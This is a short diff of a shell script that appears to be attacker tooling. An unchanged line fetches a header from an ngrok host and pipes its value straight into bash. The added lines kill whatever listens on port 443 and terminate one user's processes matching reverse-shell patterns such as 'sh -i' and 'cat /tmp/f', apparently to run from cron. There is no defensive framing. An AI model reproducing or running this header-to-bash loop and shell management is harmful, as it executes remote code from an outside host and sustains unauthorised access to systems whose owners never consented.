@@ -1,5 +1,8 @@
 curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
 
+#kill
+kill -9 $(lsof -t -i :443)
+pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl"
 #cron job
 
 # Looks cryptic at a glance
